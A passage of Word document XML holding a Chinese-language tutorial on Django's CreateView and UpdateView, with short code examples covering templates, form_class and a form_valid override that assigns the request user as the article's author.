        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>CreateView一般通过某个表单创建某个对象，通常完成后会转到对象列表。比如一个最简单的文章创建CreateView可以写成：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A4F402F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.views.generic.edit import CreateView</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="715EA3CC" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>from .models import Article</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C3E81D9" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1A448C05" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class ArticleCreateView(CreateView):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="212BB487" w14:textId="77777777"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0EB72BD7" w14:textId="52BC6997" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    fields = ['title', 'body', 'pub_date']</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24198663" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>CreateView默认的模板是model_name_form.html, 即article_form.html。默认的context_object_name是form。模板代码如下图所示:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7640573C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># blog/article_form.html</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="741C2DBF" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;form method="post"&gt;{% csrf_token %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F65BF80" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    {{ form.as_p }}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ACD518F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    &lt;input type="submit" value="Save" /&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02454F0C" w14:textId="6D705DD9" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;/form&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37F632FC" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>如果你不想使用默认的模板和默认的表单，你可以通过重写template_name和form_class来完成CreateView的自定义。虽然form_valid方法不是必需，但很有用。当用户提交的数据是有效的时候，你可以通过定义此方法做些别的事情，比如发送邮件，存取额外的数据。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="084DA78C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.views.generic.edit import CreateView</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6816E4C9"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1A384F6B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from .forms import ArticleCreateForm</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53E9E4C2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="614A92F4" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class ArticleCreateView(CreateView):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34C2FAB7" w14:textId="77777777"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55517B4B"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'blog/article_create_form.html'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="707046BF" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    form_class = ArticleCreateForm</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C2731D0" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="07EAD7B6" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    def form_valid(self, form):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6904B9A8" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">       form.do_sth()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B0ECD28" w14:textId="57621677" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">       return super().form_valid(form)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01E15FB0" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>form_valid方法一个常见用途就是就是将创建对象的用户与model里的user结合。见下面例子。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16EA37A4" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class ArticleCreateView(CreateView):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73980E41" w14:textId="77777777"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452AF93B"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'blog/article_create_form.html'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78E84793" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    form_class = ArticleCreateForm</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BE94A8C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="425BB762" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    def form_valid(self, form):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="613DBF85" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        form.instance.author = self.request.user</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E2082A2" w14:textId="5396F4E4" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        return super().form_valid(form)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00405454" w14:textId="18E9325A" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3EEFCBF8" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django通用视图之UpdateView</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1070BE71" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>UpdateView一般通过某个表单更新现有对象的信息，更新完成后会转到对象详细信息页面。它需要URL提供访问某个对象的具体参数（如pk, slug值）。比如一个最简单的文章更新的UpdateView如下所示。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B0866D9" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.views.generic.edit import UpdateView</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C73600E"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7B48A80B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="635580DD" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class ArticleUpdateView(UpdateView):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F04A974" w14:textId="77777777"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5046B2A4" w14:textId="623D9186" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    fields = ['title', 'body', 'pub_date']</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43402342" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>UpdateView和CreateView很类似，比如默认模板都是model_name_form.html。但是区别有两点: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E95611D" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>CreateView显示的表单是空表单，UpdateView中的表单会显示现有对象的数据。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13BB499D" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>用户提交表单后，CreateView转向对象列表，UpdateView转向对象详细信息页面。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1303C8BB" w14:textId="20E5B6F0" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1338665C" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>你可以通过重写template_name和form_class来完成UpdateView的自定义。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75BB8247" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>本例中默认的form是article_form.html, 你可以改为article_update_form.html。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3581DA1A" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>虽然form_valid方法不是必需，但很有用。当用户提交的数据是有效的时候，你可以通过定义此方法做些别的事情，比如发送邮件，存取额外的数据。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19A643EA" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.views.generic.edit import UpdateView</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76D1C4D5"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063111BF" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from .forms import ArticleUpdateForm</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6119AB53" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7D5BDEE0" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class ArticleUpdateView(UpdateView):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47DA0C3B" w14:textId="77777777"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05C38BC8"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'blog/article_update_form.html'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AEACA5F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    form_class = ArticleUpdateForm</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BBAE377" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="06A3A03E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
